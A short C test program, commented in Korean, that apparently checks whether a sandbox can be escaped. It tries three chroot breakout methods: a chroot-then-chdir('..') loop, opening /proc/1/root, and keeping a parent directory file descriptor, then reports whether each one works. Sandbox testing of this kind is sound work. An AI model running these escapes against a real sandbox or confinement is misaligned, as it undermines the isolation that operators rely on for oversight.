// 테스트 19: chroot 탈출 시도
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>

int main() {
    printf("chroot 탈출 시도...\n");
    
    // 방법 1: 디렉토리 생성 후 chroot
    printf("\n[1] mkdir + chroot 방법:\n");
    if (mkdir("escape_dir", 0755) == 0) {
        if (chroot("escape_dir") == 0) {
            printf("chroot 성공!\n");
            // 상위 디렉토리로 이동 시도
            for (int i = 0; i < 20; i++) {
                chdir("..");
            }
            chroot(".");
            system("ls -la");
        } else {
            printf("chroot 실패 - 권한 없음\n");
        }
    } else {
        printf("mkdir 실패\n");
    }
    
    // 방법 2: /proc/1/root 접근
    printf("\n[2] /proc/1/root 접근:\n");
    int fd = open("/proc/1/root", O_RDONLY);
    if (fd >= 0) {
        printf("호스트 루트 접근 성공!\n");
        close(fd);
    } else {
        printf("실패 - 접근 차단됨\n");
    }
    
    // 방법 3: 파일 디스크립터 유지
    printf("\n[3] 상위 디렉토리 FD 유지:\n");
    int dir_fd = open("..", O_RDONLY);
    if (dir_fd >= 0) {
        if (fchdir(dir_fd) == 0) {
            char cwd[256];
            if (getcwd(cwd, sizeof(cwd))) {
                printf("현재 디렉토리: %s\n", cwd);
            }
        }
        close(dir_fd);
    }
    
    return 0;
}





